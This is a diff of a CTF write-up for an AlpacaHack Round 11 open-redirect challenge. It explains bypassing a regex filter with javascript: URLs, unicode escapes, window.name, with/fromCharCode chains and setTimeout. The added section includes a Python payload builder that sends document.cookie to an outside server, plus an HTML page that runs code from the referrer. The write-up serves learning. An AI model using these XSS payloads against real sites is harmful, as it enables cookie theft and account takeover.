@@ -154,7 +154,7 @@ Since the URL protocol is not being checked, we can use `javascript://` urls.
 
 Using this we have to find a way to bypass the restrictions and be able to perform XSS. `eval` is blocked so any path using other encodings or `String.fromCharCode` does not work here. Certain blocked characters can be [bypassed in Javascript](https://book.jorianwoltjer.com/languages/javascript#inside-a-string) using unicode but for that we need to able to send the `\` backslash character which is blocked by the regex.
 
-This is where I got stuck for a long time during the CTF and the solution that I was closest to is [this](https://blog.maple3142.net/2025/05/17/alpacahack-round-11-writeups/en/) so i'll be using it as a reference.
+This is where I got stuck for a long time during the CTF and the solution that I was closest to and liked the most is [this](https://blog.maple3142.net/2025/05/17/alpacahack-round-11-writeups/en/) so i'll be using it as a reference.
 
 A peculiar thing to note in the regex check is the use of `parts.slice(1)` on the URL parts which is basically done to remove the `/?#` characters from the parts extracted.
 ![url slicing](image-4.png)
@@ -187,7 +187,7 @@ If the expression we supplied to the `javascript:` uri evaluates to a String the
 lmao="<h1>ok</h1>"
 location.href="javascript:lmao"
 ```
-I executed the above javascript on my console and `<h1>ok</h1>` got rendered as html. This is useful to us given we have control over any variable. 
+I executed the above javascript on my console and `<h1>ok</h1>` got rendered as html. This is useful to us given we have control over html rendered using any variable. 
 
 Another blocked keyword which we can now use with the unicode bypass is `name` as `\u006eame` which is `window.name`. We can set the `name` of our window to anything and using the technique mentioned above, if we set it to xss payload to exfiltrate cookie, we can get the flag.
 ![localtest](image-8.png)
@@ -209,3 +209,42 @@ Testing this locally results in us getting a request to attacker controlled webh
 2. Send server/webhook link to admin bot.
 ![flaginwebhook](image-7.png)
 > Flag = Alpaca{An_0pen_redirec7_is_definite1y_a_vuln3rability}
+
+---
+
+#### Other exploits
+Lets take a quick look at the few other techniques used to solve this challenge as seen here - [https://alpacahack.com/ctfs/round-11/writeups](https://alpacahack.com/ctfs/round-11/writeups):
+
+Multiple solutions make use of the `with` [statement in javascript](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with). With it we can specify an object as the default object and the statements following `with` statement will refer to the methods without specifying an object. Using this technique, we can do `String.fromCharCode`
+![get string.fromCharCode working](image-9.png).
+And to construct a payload like `name`, we can use `String.concat` to create payload:
+```js
+with(String)with(String())with(concat(fromCharCode(110)))with(concat(fromCharCode(97)))with(concat(fromCharCode(109)))concat(fromCharCode(101))
+```
+To get this payload to render in the dom, we can use `document.createRange().createContextualFragment`
+
+Another variation of this can be seen below which can use setTimeout to evaluate the string
+[https://zenn.dev/claustra01/articles/4fdad6b096fe41](https://zenn.dev/claustra01/articles/4fdad6b096fe41)
+```py
+script = "location.href='https://ctf-server.claustra01.net?'+document.cookie;"
+
+encoded = "with(String)with(fromCharCode())" 
+for c in script[:-1]:
+    encoded += f"with(concat(fromCharCode({ord(c)})))"
+encoded += f"setTimeout(concat(fromCharCode({ord(script[-1])})))"
+
+url = "http://redirector:3000?next=javascript:" + encoded
+print(url)
+```
+
+
+Another interesting solution was
+[https://gist.github.com/parrot409/9e87e7add57cbe543e03678a9f9aa806](https://gist.github.com/parrot409/9e87e7add57cbe543e03678a9f9aa806)
+```html
+<meta name="referrer" content="unsafe-url" />
+<script>
+ // current src: ?%0aalert()
+location="http://34.170.146.252:48709/?next=javascript:with(document)setTimeout(decodeURIComponent(referrer))"
+</script>
+```
+use referrer as an attacker controlled variable and use setTimeout instead of the blocked eval to execute js.
